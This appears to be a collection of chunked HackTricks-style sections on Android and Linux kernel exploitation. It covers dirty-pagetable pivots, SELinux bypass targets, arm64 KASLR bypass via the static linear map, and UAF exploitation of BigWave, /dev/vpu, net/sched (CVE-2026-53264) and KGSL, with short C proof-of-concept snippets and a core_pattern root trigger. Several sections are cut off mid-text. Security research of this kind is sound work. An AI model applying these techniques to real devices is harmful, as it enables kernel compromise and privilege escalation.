text: ## Stabilizing to fast, reliable CPU-side kernel R/W (dirty pagetable) GPU R/W is slow and small-granularity. Pivot to a fast/stable primitive by corrupting your own process PTEs (“dirty pagetable”):<sup>[[1]](#references)</sup><sup>[[4]](#references)</sup> Steps - Locate current task_struct -> mm_struct -> mm_struct->pgd using the slow GPU R/W primitives - mmap two adjacent userspace pages A and B (e.g., at 0x1000) - Walk PGD->PMD->PTE to resolve A/B’s PTE physical addresses (helpers: get_pgd_offset, get_pmd_offset, get_pte_offset) - Overwrite B’s PTE to point to the last-level pagetable managing A/B with RW attributes (phys_to_readwrite_pte) - Write via B’s VA to mutate A’s PTE to map target PFNs; read/write kernel memory via A’s VA, flushing TLB until a sentinel flips <details> <summary>Example dirty-pagetable pivot snippet</summary> ```c uint64_t *map = mmap((void*)0x1000, PAGE_SIZE*2, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, 0, 0); uint64_t *page_map = (void*)((uint64_t)map + PAGE_SIZE); page_map[0] = 0x4242424242424242; uint64_t tsk = get_curr_task_struct(ctx); uint64_t mm = kernel_vread_u64(ctx, tsk + OFFSETOF_TASK_STRUCT_MM); uint64_t mm_pgd = kernel_vread_u64(ctx, mm + OFFSETOF_MM_PGD); uint64_t pgd_off = get_pgd_offset((uint64_t)map); uint64_t phys_pmd = kernel_vread_u64(ctx, mm_pgd + pgd_off) & ~((1<<12)-1); uint64_t pmd_off = get_pmd_offset((uint64_t)map); uint64_t phys_pte = kernel_pread_u64(ctx, phys_pmd + pmd_off) & ~((1<<12)-1); uint64_t pte_off = get_pte_offset((uint64_t)map); uint64_t pte_addr = phys_pte + pte_off; uint64_t new_pte = phys_to_readwrite_pte(pte_addr); kernel_write_u64(ctx, pte_addr + 8, new_pte, false); while (page_map[0] == 0x4242424242424242) flush_tlb(); ``` </details>

text: ## Detection - Telemetry: alert if CP_SMMU_TABLE_UPDATE (or similar privileged opcodes) appears outside RB/IB0, especially in SDS; monitor anomalous bursts of 4/8-byte CP_MEM_TO_MEM and excessive TLB flush patterns

title: HT: Android Kernel SELinux Bypass After Arbitrary R/W (android-kernel-selinux-bypass)
text: # Android Kernel SELinux Bypass After Arbitrary R/W {{#include ../../banners/hacktricks-training.md}} An Android kernel exploit is not finished when it obtains arbitrary kernel read/write or replaces the current task's credentials: UID 0 and Linux capabilities do **not** remove the task's SELinux domain. A process can therefore become root and still receive AVC denials when it tries to execute a shell, access a device node, or cross another label boundary. The following targets assume an existing kernel-memory primitive and focus on converting it into a usable SELinux bypass.<sup>[[1]](#references)[[5]](#references)</sup>

title: HT: Resolve the exact build before writing (android-kernel-selinux-bypass)
text: ## Resolve the exact build before writing Do not reuse offsets across kernel builds. The location and layout moved from globals such as `selinux_enforcing`, `ss_initialized`, and `current_mapping` on old kernels to fields below `selinux_state` and `selinux_state.policy` on newer kernels; several relevant structures also use `__randomize_layout`. Recover symbols from the exact `vmlinux`/symbol table, derive the KASLR slide from a kernel leak, and verify expected bytes with the read primitive before writing.<sup>[[1]](#references)[[3]](#references)[[4]](#references)</sup> Useful device-side triage is:<sup>[[1]](#references)</sup> ```bash cat /proc/self/attr/current cat /proc/config.gz | zgrep 'SECURITY_SELINUX\|RANDOMIZE_BASE' cat /proc/kallsyms | grep -E 'selinux_state|selinux_enforcing|ss_initialized|security_hook_heads' cat /proc/slabinfo | grep avc_node adb pull /sys/fs/selinux/policy ./policy sesearch ./policy --allow -s untrusted_app ``` Production builds usually hide `/proc/kallsyms` addresses and may restrict `/proc/slabinfo`. In that case, use a build-specific `vmlinux` plus a leaked code/data pointer, BTF/DWARF information when available, or an arbitrary read that scans for build-validated invariants instead of hardcoding an offset copied from another device.<sup>[[1]](#references)[[5]](#references)</sup>

title: HT: Choose the smallest useful corruption target (android-kernel-selinux-bypass)
text: ## Choose the smallest useful corruption target The six useful target families sit at different points of the SELinux decision path. Prefer a narrow or temporary target when it is enough to complete the next stage; broad global changes are easier to detect and more likely to destabilize the device.<sup>[[1]](#references)</sup> | Target | Effect | Important constraint | |---|---|---| | `selinux_state.enforcing` / `selinux_enforcing` | Global permissive mode; denials are still audited | The field may be compiled out or protected by a vendor hypervisor | | `policydb.permissive_map` | Makes selected source types permissive | Requires the numeric policy type and vendor code must honor `AVD_FLAGS_PERMISSIVE` | | `avc_node.ae.avd.allowed` | Allows a selected source SID, target SID and class tuple | Only affects an existing cache entry; eviction and policy sequence changes invalidate it | | `selinux_state.initialized` / `ss_initialized` | Makes policy computation follow the not-initialized allow path | Highly unstable and cached decisions may avoid recomputation | | `policy->map.mapping[].perms` plus `policydb.allow_unknown` | Converts selected mapped permissions into allowed unknown permissions | Existing denied AVC entries can remain effective | | SELinux entries in `security_hook_heads` | Removes selected checks from LSM dispatch | Hook storage can be read-only and indiscriminate removal can crash the kernel | ### Global or domain-scoped permissive mode On kernels that include `CONFIG_SECURITY_SELINUX_DEVELOP`, clearing `selinux_state.enforcing` makes `avc_denied()` return success for non-strict checks. Older kernels use the global `selinux_enforcing`. If the option is disabled, the mutable field may not exist at all, so first confirm both the config and the exact structure

title: HT: Cross-cache and device-write pivots (android-kernel-selinux-bypass)
text: ## Cross-cache and device-write pivots When a stale pointer cannot directly overlap the desired cache, a cross-cache attack can return the vulnerable object's entire slab to the page allocator and spray a different object type onto the same physical pages. Applying this generic pattern to SELinux means grooming the vulnerable cache until the victim slab is discarded, then generating distinct permission checks so `avc_node` objects reclaim it; the dangling write can then hit the decision mask. Determine `objs_per_slab`, slab order, CPU partial-list behavior, page migratetype, and allocator noise on the target—freelist randomization inside one cache does not by itself prevent page-level reuse.<sup>[[2]](#references)[[5]](#references)</sup> A CPU-side arbitrary write may still fault on pages protected by EL2 or `__ro_after_init`. A compromised DMA-capable device can provide a different physical-write path if its IOMMU/SMMU mappings permit the target page. This is not an automatic SELinux bypass: it additionally requires control of the GPU/device command stream and a mapping flaw or permissive IOMMU configuration. Use it only as a way to reach an otherwise protected target such as selected LSM-hook list entries.<sup>[[1]](#references)[[5]](#references)</sup> {{#ref}} adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md {{#endref}}

title: HT: Exploit-chain ordering (android-kernel-selinux-bypass)
text: ## Exploit-chain ordering A robust local chain usually proceeds as follows: obtain kernel read/write, resolve the exact build and KASLR slide, apply the narrowest SELinux change needed, then replace the current task's UID/GID/capability fields or use a legitimate credential path whose hook was removed. Test both identity (`id`) and an operation crossing a real label boundary; UID 0 alone is not evidence that SELinux was bypassed.<sup>[[1]](#references)[[5]](#references)</sup> For a temporary cache or initialization bypass, perform the durable step immediately and restore modified global state. Re-read every target after writing, expect RCU/concurrent-cache activity, and avoid assuming that a successful write means the decision path consumed the modified object.<sup>[[1]](#references)</sup>

title: HT: Linux arm64 Static Linear Map KASLR Bypass (arm64-static-linear-map-kaslr-bypass)
text: # Linux arm64 Static Linear Map KASLR Bypass {{#include ../../banners/hacktricks-training.md}}

title: HT: Overview (arm64-static-linear-map-kaslr-bypass)
text: ## Overview Android kernels built for arm64 almost universally enable **`CONFIG_ARM64_VA_BITS=39`** (3-level paging) and **`CONFIG_MEMORY_HOTPLUG=y`**. With only 512 GiB of kernel virtual space available, the Linux developers chose to anchor the **linear map** at the lowest possible kernel VA so that future hot-plugged RAM can simply extend the mapping upward. Since commit `1db780bafa4c`, arm64 no longer even attempts to randomize that placement, which means:<sup>[[1]](#references)</sup> - `PAGE_OFFSET = 0xffffff8000000000` is compiled in. - `PHYS_OFFSET` is sourced from the exported `memstart_addr`, which on stock Android devices is effectively constant (0x80000000 today). As a consequence, **every physical page has a deterministic linear-map virtual address that is independent of the KASLR slide**: ```c #define phys_to_virt(p) (((unsigned long)(p) - 0x80000000UL) | 0xffffff8000000000UL) ``` If an attacker can learn or influence a physical address (kernel object, PFN from `/proc/pagemap`, or even a user-controlled page), they instantly know the corresponding kernel virtual address without leaking the randomized primary kernel mapping.<sup>[[1]](#references)</sup>

title: HT: Reading `memstart_addr` and confirming the transform (arm64-static-linear-map-kaslr-bypass)
text: ## Reading `memstart_addr` and confirming the transform `memstart_addr` is exported in `/proc/kallsyms` and can be read on rooted devices or via any arbitrary kernel-read primitive. Project Zero used Jann Horn's tracing-BPF helper (`bpf_arb_read`) to dump it directly:<sup>[[1]](#references)</sup> ```bash grep memstart /proc/kallsyms

title: HT: ... obtains memstart_addr virtual address (arm64-static-linear-map-kaslr-bypass)
text: # ... obtains memstart_addr virtual address ./bpf_arb_read <addr_of_memstart_addr> 8 ``` The bytes `00 00 00 80 00 00 00 00` confirm `memstart_addr = 0x80000000`. Once `PAGE_OFFSET` and `PHYS_OFFSET` are pinned, the arm64 linear map is a static affine transform of any physical address.<sup>[[1]](#references)</sup>

title: HT: Deriving stable `.data` addresses on devices with a fixed kernel physbase (arm64-static-linear-map-kaslr-bypass)
text: ## Deriving stable `.data` addresses on devices with a fixed kernel physbase Many Pixels still decompress the kernel at **`phys_kernel_base = 0x80010000`** on every boot (visible in `/proc/iomem`). Combining that with the static transform yields cross-reboot-stable addresses for any data symbol:<sup>[[1]](#references)</sup> 1. Record the randomized kernel virtual address of `_stext` and of your target symbol from `/proc/kallsyms` (or from the exact `vmlinux`). 2. Compute the offset: `offset = sym_virt - _stext_virt`. 3. Add the static boot-time physbase: `phys_sym = 0x80010000 + offset`. 4. Convert to a linear-map VA: `virt_sym = phys_to_virt(phys_sym)`. Example (`modprobe_path` on a Pixel 9): `offset = 0x1fe2398`, `phys = 0x81ff2398`, `virt = 0xffffff8001ff2398`. After multiple reboots, `bpf_arb_read 0xffffff8001ff2398` returns the same bytes, so exploit payloads can treat `0xffffff8000010000` as a synthetic, non-randomized base for all `.data` offsets.<sup>[[1]](#references)</sup> This mapping is **RW**, so any primitive that can place attacker data in kernel virtual space (double free, UAF, non-paged heap write, etc.) can patch credentials, LSM hooks, or dispatch tables without ever leaking the true KASLR slide. The only limitation is that `.text` is mapped non-executable in the linear map, so gadget hunting still requires a traditional leak.<sup>[[1]](#references)</sup>

title: HT: PFN spraying when the kernel physbase is randomized (arm64-static-linear-map-kaslr-bypass)
text: ## PFN spraying when the kernel physbase is randomized Vendors such as Samsung randomize the kernel load PFN, but the static linear map is still abusable because PFN allocation is not fully random:<sup>[[1]](#references)</sup> 1. **Spray user pages**: `mmap()` ~5 GiB, touch every page to fault it in. 2. **Harvest PFNs**: read `/proc/pagemap` for each page (or use another PFN leak) to collect the backing PFN list. 3. **Repeat and profile**: reboot, rerun 100×, build a histogram showing how often each PFN was attacker-controlled. Some PFNs are white-hot (allocated 100/100 times shortly after boot). 4. **Convert PFN → kernel VA**: - `phys = (pfn << PAGE_SHIFT) + offset_in_page` - `virt = phys_to_virt(phys)` 5. **Forge kernel objects in those pages** and steer victim pointers (UAF, overflow, etc.) to the known linear-map addresses. Because the linear map is identity-mapped RW memory, this technique lets you place fully attacker-controlled data at deterministic kernel VAs even when the real kernel base moves. Exploits can prebuild fake `file_operations`, `cred`, or refcount structures inside the sprayed pages and then pivot existing kernel pointers into them.<sup>[[1]](#references)</sup>

title: HT: Practical workflow for arm64 Android exploits (arm64-static-linear-map-kaslr-bypass)
text: ## Practical workflow for arm64 Android exploits 1. **Info gathering** - Root or use a kernel read primitive to dump `memstart_addr`, `_stext`, and the target symbol from `/proc/kallsyms`. - On Pixels, trust the static physbase from `/proc/iomem`; on other devices, prepare the PFN profiler. 2. **Address calculation** - Apply the offset math above and cache the resulting linear-map VAs in your exploit. - For PFN spraying, keep a list of "reliable" PFNs that repeatedly land in attacker memory. 3. **Exploit integration** - When an arbitrary write is available, directly patch targets such as `modprobe_path`, `init_cred`, or security ops arrays at the precomputed addresses. - When only a heap corruption exists, craft fake objects in the known-supervised pages and repoint victim pointers to those linear-map VAs. 4. **Verification** - Use `bpf_arb_read` or any safe read primitive to sanity-check that the computed address contains the expected bytes before destructive writes. This workflow eliminates the KASLR-leak stage for data-centric kernel exploits on Android, which drastically lowers exploit complexity and improves reliability.<sup>[[1]](#references)</sup>

title: HT: Transactional rollback bugs to kernel UAF and fake-object execution (nftables-catchall-rollback-uaf)
text: ## Transactional rollback bugs to kernel UAF and fake-object execution Transactional kernel APIs are interesting when **commit and abort do not apply symmetric lifetime changes**. An abort may restore an object's visibility bit but forget its reference, or restore the reference while leaving the object inactive. The nftables catchall-map bug fixed by `f41c5d151078` is a concrete example: `nft_map_catchall_activate()` skipped inactive elements in the abort path. An aborted `DELSET` therefore left both the generation mask and the referenced chain's `use` count inconsistent.<sup>[[1]](#references)[[2]](#references)</sup> ### Converting rollback desynchronization into a dangling reference A useful audit target is an object that is referenced through two independently managed paths. In the nftables case, an ingress base-chain rule and a pipapo verdict-map catchall both hold `NFT_GOTO` references to the same regular chain. The following transaction sequence turns the missed rollback into a UAF:<sup>[[2]](#references)</sup> 1. Delete the verdict map, then deliberately fail a later operation in the same netlink batch. Deactivation marks the catchall inactive in the next generation and drops its chain reference. The broken abort path restores neither state. 2. Commit an unrelated valid change, such as creating a dummy chain. This flips the generation cursor without changing the catchall's mask, so the catchall becomes active relative to the new next generation. 3. Delete the verdict map again. Its catchall is deactivated a second time and the chain count reaches zero. 4. Delete the regular chain. The base-chain rule still contains its verdict pointer, so packet evaluation or rule serialization now dereferences freed chain state. This pattern generalizes beyond nftables: identify

title: HT: Pixel BigWave BIGO timeout race UAF → 2KB kernel write from mediacodec (pixel-bigwave-bigo-job-timeout-uaf-kernel-write)
text: # Pixel BigWave BIGO timeout race UAF → 2KB kernel write from mediacodec {{#include ../../banners/hacktricks-training.md}}

title: HT: TL;DR (pixel-bigwave-bigo-job-timeout-uaf-kernel-write)
text: ## TL;DR - From the SELinux-confined **mediacodec** context, `/dev/bigwave` (Pixel AV1 hardware accelerator) is reachable. A backlog of jobs makes `BIGO_IOCX_PROCESS` hit its **16s wait_for_completion_timeout()** and return while the worker thread concurrently dequeues the same inline `job` structure.<sup>[[1]](#references)[[2]](#references)</sup> - Closing the FD immediately frees `struct bigo_inst` (which embeds `struct bigo_job`). The worker reconstructs `inst = container_of(job, ...)` and later uses freed fields such as **`job->regs`** inside `bigo_run_job()`, yielding a **Use-After-Free on the inline job/inst**.<sup>[[1]](#references)[[2]](#references)</sup> - `bigo_pull_regs(core, job->regs)` performs `memcpy_fromio(regs, core->base, core->regs_size)`. By reclaiming the freed slab and overwriting `job->regs`, an attacker gets a **~2144-byte arbitrary kernel write** to a chosen address, with partial control of the bytes by pre-programming register values before the timeout.<sup>[[1]](#references)[[2]](#references)</sup> - Tracked as **CVE-2025-36934**; fixed in the **2026-01-05 Pixel/2025-12-01 ASB** builds.<sup>[[3]](#references)</sup>

title: HT: Attack surface mapping (SELinux → /dev reachability) (pixel-bigwave-bigo-job-timeout-uaf-kernel-write)
text: ## Attack surface mapping (SELinux → /dev reachability) - Use tools like **DriverCartographer** to enumerate device nodes accessible from a given SELinux domain. Despite mediacodec’s constrained policy (software decoders should stay in an isolated context), `/dev/bigwave` remained reachable, exposing a large attack surface to post-media-RCE code.<sup>[[1]](#references)</sup>

title: HT: Vulnerability: BIGO_IOCX_PROCESS timeout vs worker (pixel-bigwave-bigo-job-timeout-uaf-kernel-write)
text: ## Vulnerability: BIGO_IOCX_PROCESS timeout vs worker - Flow: ioctl copies user register buffer into `job->regs`, queues the inline `job`, then `wait_for_completion_timeout(..., 16s)` is called. On timeout it tries to dequeue/cancel and returns to userspace. - Meanwhile `bigo_worker_thread` may have just dequeued the same `job`: ```c inst = container_of(job, struct bigo_inst, job); bigo_push_regs(core, job->regs); ... bigo_pull_regs(core, job->regs); // memcpy_fromio(regs, core->base, core->regs_size) *(u32 *)(job->regs + BIGO_REG_STAT) = status; ``` - If userspace closes the FD after the timeout, `inst`/`job` are freed while the worker keeps using them → UAF. No synchronization ties FD lifetime to the worker thread’s job pointer.<sup>[[1]](#references)[[2]](#references)</sup>

title: HT: Exploitation outline (pixel-bigwave-bigo-job-timeout-uaf-kernel-write)
text: ## Exploitation outline 1. **Backlog + timeout:** Queue enough jobs so the worker is delayed, then issue `BIGO_IOCX_PROCESS` and let it hit the 16s timeout path. 2. **Free while in use:** As soon as ioctl returns, `close(fd)` to free `inst`/`job` while the worker is still running the dequeued job. 3. **Reclaim + pointer control:** Spray reclaimers (e.g., **Unix domain socket message** allocations) to occupy the freed slab slot and overwrite the inline `job`, especially `job->regs`. 4. **Arbitrary write:** When `bigo_pull_regs()` runs, `memcpy_fromio()` writes **core->regs_size (~2144 bytes)** from MMIO into the attacker-supplied address in `job->regs`, producing a large write-what-where without a KASLR leak. 5. **Data shaping:** Because registers are first programmed from user data (`bigo_push_regs`), set them so the hardware does not execute, keeping the copied-back register image close to attacker-controlled bytes.<sup>[[1]](#references)</sup> ### Minimal PoC skeleton (blocking backlog + reclaim) ```c int fd = open("/dev/bigwave", O_RDWR); for (int i = 0; i < 64; i++) submit_job(fd, regs_buf); // fill worker queue submit_job(fd, regs_buf); // victim job auto t0 = now(); while (now() - t0 < 17000ms) sched_yield(); // hit 16s timeout close(fd); // free inst/job spray_uds_msgs(payload_pointing_to_target, spray_count); // reclaim slab sleep(1); // let worker memcpy_fromio ``` - `regs_buf` should preconfigure BigWave to idle (e.g., set control bits to skip execution) so the copied-back register image stays deterministic.

title: HT: Related successor primitive on Pixel 10: unbounded `/dev/vpu` `mmap()` → physical-memory R/W (pixel-bigwave-bigo-job-timeout-uaf-kernel-write)
text: ## Related successor primitive on Pixel 10: unbounded `/dev/vpu` `mmap()` → physical-memory R/W Project Zero's Pixel 10 follow-up replaced BigWave with another **mediacodec-reachable** driver: `/dev/vpu` for the **Chips&Media Wave677DV** decoder. The bug class is even shallower: the driver intends to expose only the VPU MMIO CSR window, but its `mmap` handler trusts the attacker-controlled VMA length.<sup>[[4]](#references)[[5]](#references)</sup> ```c static int vpu_mmap(struct file *fp, struct vm_area_struct *vm) { ... pfn = core->paddr >> PAGE_SHIFT; return remap_pfn_range(vm, vm->vm_start, pfn, vm->vm_end - vm->vm_start, vm->vm_page_prot) ? -EAGAIN : 0; } ``` ### Why this is exploitable - `pfn` is fixed to the VPU MMIO physical base (`core->paddr >> PAGE_SHIFT`). - The mapped length is **`vm->vm_end - vm->vm_start`**, i.e. the user-requested `mmap()` size. - There is **no check** that the requested size is bounded by the real MMIO resource length. Therefore, if `/dev/vpu` is reachable from a compromised app/service domain, a large `mmap()` does not stop at the register window: it keeps mapping the **contiguous physical pages after the VPU MMIO range** into userspace.<sup>[[4]](#references)</sup> ### Exploitation model 1. Gain code execution in a context allowed to open `/dev/vpu` (for example **mediacodec** after a media-parser bug). 2. `open("/dev/vpu", O_RDWR)`. 3. `mmap()` a region much larger than the real CSR/MMIO window. 4. Compute the offset from the returned mapping to the kernel physical base. 5. Read or overwrite kernel `.text`, `.data`, credentials, function pointers, or build a more convenient arbitrary R/W primitive.<sup>[[4]](#references)</sup> Representative pattern: ```c int fd = open("/dev/vpu", O_RDWR); void *map = mmap(NULL, HUGE_LEN, PROT_READ|PR

title: HT: Takeaways for driver reviewers (pixel-bigwave-bigo-job-timeout-uaf-kernel-write)
text: ## Takeaways for driver reviewers - Inline per-FD job structs enqueued to async workers must hold references that survive timeout/cancel paths; **closing an FD must synchronize with worker consumption**. - Any MMIO copy helpers (`memcpy_fromio`/`memcpy_toio`) that use buffer pointers from jobs should be validated or duplicated before enqueuing to avoid UAF→write primitives.

title: HT: net/sched action-IDR UAF exploitation (CVE-2026-53264) (net-sched-action-idr-uaf-cve-2026-53264)
text: # net/sched action-IDR UAF exploitation (CVE-2026-53264) {{#include ../../banners/hacktricks-training.md}} CVE-2026-53264 is a Linux `net/sched` lifetime race: an action returned from the per-network-namespace `action_idr` is read under RCU, but the last reference could remove and immediately free the `tc_action` without an RCU grace period. The public CentOS Stream 9 exploit turns the stale `kmalloc-256` object into a forged operations table, pivots a kernel stack, and overwrites `core_pattern` for local privilege escalation.<sup>[[1]](#references)[[2]](#references)</sup>

title: HT: Root cause: RCU lookup without RCU lifetime (net-sched-action-idr-uaf-cve-2026-53264)
text: ## Root cause: RCU lookup without RCU lifetime `tcf_idr_check_alloc()` looks up a shared action by index and only later takes a reference with `refcount_inc_not_zero()`. Concurrent filter deletion can drop the last reference, remove the action from the IDR, unlock, and reach `kfree()` while the reader still holds the pointer. RCU protects the IDR traversal, but it cannot protect an object whose final free is not deferred.<sup>[[1]](#references)[[2]](#references)</sup> ```text CPU 0 (lookup) CPU 1 (last put) CPU 2 p = idr_find(action_idr, id) refcount 1 -> 0 idr_remove(id) kfree(p) reclaim p refcount_inc_not_zero(&p->tcfa_refcnt) ``` A useful reclaim must happen before the final refcount operation and place a nonzero value over `tcfa_refcnt`; otherwise the reader safely returns `-EAGAIN`. This makes the primitive a **free + same-cache reclaim inside one very small window**, not merely a dangling lookup.<sup>[[2]](#references)</sup>

title: HT: Reachability from an unprivileged process (net-sched-action-idr-uaf-cve-2026-53264)
text: ## Reachability from an unprivileged process Standalone `RTM_NEWACTION`/`RTM_DELACTION` requires `CAP_NET_ADMIN` in the initial user namespace. The exploitable route instead creates and removes filters with `RTM_NEWTFILTER`/`RTM_DELTFILTER` inside a new user and network namespace, where the attacker has namespaced `CAP_NET_ADMIN`. A `clsact` Qdisc and `flower` classifier provide unlocked filter operations, avoiding the RTNL serialization that would otherwise close the race.<sup>[[2]](#references)[[3]](#references)</sup> Practical gates for this route are:<sup>[[2]](#references)</sup> - unprivileged user namespaces must be available; - `CONFIG_NET_ACT_GACT=y|m` and `CONFIG_NET_CLS_FLOWER=y|m` must be present; - the attacker must be able to configure the loopback device in the new network namespace; - the kernel must lack the deferred-free fix or its vendor backport. Non-destructive configuration checks (not a vulnerability probe) include:<sup>[[2]](#references)</sup> ```bash grep -E '^CONFIG_(USER_NS|NET_ACT_GACT|NET_CLS_FLOWER)=' \ "/boot/config-$(uname -r)" 2>/dev/null sysctl kernel.unprivileged_userns_clone user.max_user_namespaces 2>/dev/null ```

title: HT: Making the lookup/free race practical (net-sched-action-idr-uaf-cve-2026-53264)
text: ## Making the lookup/free race practical ### Hard-IRQ window widening A short `timerfd` expiry can interrupt the lookup CPU in the target window. Registering many duplicated timer FDs in many `epoll` instances gives the wakeup handler a very long waitqueue to traverse in hard-IRQ context, pausing that CPU while other CPUs delete and reclaim the object. Sweep the delay between arming the timer and sending the netlink message because the correct timing depends on the CPU and kernel build.<sup>[[2]](#references)[[4]](#references)</sup> ```c struct itimerspec its = { .it_value = { .tv_nsec = delay } }; timerfd_settime(tfd, 0, &its, NULL); for (volatile int i = 0; i < spin; i++); nl_do(fd, bind_filter_msg); ``` This technique is more deterministic than racing two freely scheduled threads: the attacker arranges a hardware-timer interrupt at the interesting point and deliberately makes its wakeup work expensive.<sup>[[4]](#references)</sup> ### Binder/deleter layout and the error-path accelerator Pin workers to different CPUs and give each binder a separate filter chain; `tcf_chain_tp_find()` has a per-chain mutex, so reusing one chain serializes attempts. One deleter repeatedly creates and removes a filter holding a known action index, while multiple binders look up that index.<sup>[[2]](#references)[[3]](#references)</sup> Each binder submits two actions in one filter request:<sup>[[2]](#references)[[3]](#references)</sup> 1. a valid `gact` referring to the shared action index; 2. a deliberately malformed action. The first action reaches `tcf_idr_check_alloc()` and `tcf_action_fill_size()`. The second fails before `tcf_idr_insert_many()`, so cleanup drops the binder's reference without ever committing a filter. This removes one create/delete netlink round trip from every bin

title: HT: Reclaiming `tc_action` with RCU-managed keys (net-sched-action-idr-uaf-cve-2026-53264)
text: ## Reclaiming `tc_action` with RCU-managed keys The demonstrated victim is in `kmalloc-256`. Repeated `KEYCTL_UPDATE` calls allocate new `user_key_payload` objects and queue displaced payloads for RCU freeing. A persistent payload can therefore occupy the freed action slot while its `rcu.next` field overlaps `tc_action.ops` and its controlled data supplies a nearby fake operations table.<sup>[[2]](#references)[[3]](#references)</sup> ```text tc_action offset user_key_payload overlap 0x00 ops rcu.next 0x08 type rcu.func 0x10 idrinfo datalen / padding 0x18 tcfa_index attacker-controlled data begins ``` `tcf_action_fill_size()` provides the control-flow trigger because it invokes `act->ops->get_fill_size(act)`. In the published layout, an attacker-chosen pointer in the reclaimed payload is interpreted as `get_fill_size`, yielding an indirect-call target after the raced reference succeeds.<sup>[[2]](#references)[[3]](#references)</sup> Temporary key-copy buffers can also reuse the slot and place fully controlled bytes at offset zero, which may crash before the intended persistent payload wins. The exploit makes accidental reuse less destructive by placing a leaked kernel address containing NULL bytes first; another option is choosing a payload length whose temporary copy allocation lands in a different slab cache while the persistent `user_key_payload` still matches the victim cache.<sup>[[2]](#references)</sup>

title: HT: From indirect call to privileged execution (net-sched-action-idr-uaf-cve-2026-53264)
text: ## From indirect call to privileged execution The public exploit first defeats KASLR, then uses a build-specific `leave`-style gadget because the generated `tcf_action_fill_size()` code on the target leaves `rbp` pointing into the reclaimed payload. This is not portable: later compiler/kernel builds may use `ebp`, different stack frames, different structure layouts, or incompatible gadgets.<sup>[[2]](#references)[[3]](#references)</sup> The first ROP stage copies a second chain from user memory and pivots away from the heap payload. Leaving `rsp` inside `user_key_payload` is unsafe: a context switch or sleep can grow the kernel stack into adjacent slab objects and write a `pt_regs` frame there. The demonstrated chain therefore pivots again to a sufficiently large, writable, NULL-filled kernel region before sleeping.<sup>[[2]](#references)</sup> The final chain writes a piped core handler such as `|/proc/%P/fd/666 %P` to `core_pattern`. After detecting the change, a child copies the exploit executable into a memfd, duplicates it to FD 666, and crashes; the kernel resolves that FD through the crashing process and launches the memfd as the core handler with initial-namespace root privileges.<sup>[[2]](#references)[[3]](#references)</sup> ```c int memfd = memfd_create("", 0); sendfile(memfd, open("/proc/self/exe", O_RDONLY), NULL, 0xffffffff); dup2(memfd, 666); *(volatile size_t *)0 = 0; /* invoke the piped core handler */ ```

title: HT: Fix and audit pattern (net-sched-action-idr-uaf-cve-2026-53264)
text: ## Fix and audit pattern The fix adds an `rcu_head` to `tc_action` and replaces the final raw `kfree(p)` with `kfree_rcu(p, tcfa_rcu)`. A stale reader can then fail the zero-refcount increment while the allocation remains valid until every pre-existing RCU reader exits.<sup>[[1]](#references)</sup> For similar bugs, audit data structures where lookup is advertised as RCU-safe but deletion uses a different lock and performs an immediate free. The important invariant is not merely that the container lookup is RCU-safe: every object returned to an RCU reader must also remain allocated for the complete read-side critical section.<sup>[[1]](#references)[[2]](#references)</sup> Patch-status checks should look for commit `5057e1aca011` or the equivalent `tc_action` `kfree_rcu()` backport rather than relying only on a distribution version string. Disabling unprivileged user namespaces removes the published unprivileged reachability path, but updating to a fixed kernel is the actual remediation.<sup>[[1]](#references)[[2]](#references)</sup>

title: HT: Qualcomm KGSL VBO bind race to physical page UAF (qualcomm-kgsl-vbo-bind-race-physical-uaf)
text: # Qualcomm KGSL VBO bind race to physical page UAF {{#include ../../banners/hacktricks-training.md}} Qualcomm KGSL lets an Android process allocate GPU memory through `/dev/kgsl-3d0`. A Basic Memory Object (BMO) owns physical pages, while a Virtual Buffer Object (VBO) reserves sparse GPU virtual space. `IOCTL_KGSL_GPUMEM_BIND_RANGES` can attach ranges from one or more BMOs or imported userspace objects to that VBO.<sup>[[1]](#references)</sup> The important lifetime invariant is that a source object and its pages must remain referenced until every CPU and GPU mapping has been removed. CVE-2024-23380 demonstrates how violating this invariant turns a reference-count race into a stale GPU IOMMU mapping to pages returned to the allocator.<sup>[[1]](#references)[[2]](#references)</sup>

title: HT: VBO range publication race (qualcomm-kgsl-vbo-bind-race-physical-uaf)
text: ## VBO range publication race Each VBO keeps its bindings in an interval tree protected by `memdesc->ranges_lock`. In the vulnerable sequence, `kgsl_memdesc_add_range()` inserts a range carrying a reference to the source object, releases the mutex, and only then calls `kgsl_mmu_map_child()` to install the physical-to-GPU mapping.<sup>[[1]](#references)[[2]](#references)</sup> ```text bind thread unbind thread ----------- ------------- lock ranges_lock publish range + source reference unlock ranges_lock lock ranges_lock remove range + drop reference unlock ranges_lock map source pages into VBO ``` If userspace releases its last BMO reference during this window, the BMO and its backing pages can be freed while the bind thread still maps them. The interval tree then says that the VBO range is unbound, but the GPU IOMMU still resolves its GPU virtual addresses to the freed physical pages. This is a **physical-page UAF**, not merely a dangling kernel-heap pointer.<sup>[[1]](#references)</sup> The corrected ordering performs `kgsl_mmu_map_child()` while `ranges_lock` is held and publishes the interval only after the mapping succeeds. Consequently, an unbind cannot drop the range reference until mapping has completed.<sup>[[2]](#references)</sup>

title: HT: Turning stale GPU mappings into controlled pages (qualcomm-kgsl-vbo-bind-race-physical-uaf)
text: ## Turning stale GPU mappings into controlled pages The exploit strategy is a primitive ladder. Offsets, object sizes, physical ranges, command packet encodings, and allocator behavior are specific to the target driver and firmware.<sup>[[1]](#references)</sup> 1. **Accumulate stale mappings.** Race bind and unbind operations on the same VBO range, release the source BMO, and repeat. Failed attempts generally leave the range unbound instead of immediately corrupting another object, so many attempts can be made. 2. **Validate a won race.** Put a sentinel in the source page and read the VBO through a GPU copy command such as `CP_MEM_TO_MEM`. A persistent value indicates that the GPU still resolves the page. 3. **Eliminate the valid-binding false positive.** A losing `Unbind -> Bind` interleaving also preserves the sentinel because the final bind is valid. Issue one additional unbind after every race. It removes a valid binding and restores the zero-page behavior, but it cannot remove the hidden stale mapping from a true `Bind -> Unbind` UAF. Only the true UAF keeps the sentinel. 4. **Move pages out of the KGSL pool.** Freed graphics pages may remain in a driver-private pool controlled by `kgsl_pool_max_pages`. Create system-wide memory pressure so kernel reclaim drains that pool into the general page allocator. Until this happens, the stale pages tend to be reused only as GPU backing memory. 5. **Spray low-overhead KGSL objects.** Allocate many VBOs or imported userspace memory objects. They create controllable `kgsl_mem_entry` objects without the extra physical backing allocation of a BMO. Use `IOCTL_KGSL_GPUOBJ_SET_INFO` to give each object's `metadata` field a distinct sentinel. 6. **Discover an overlap.** Read the stale pages with GPU 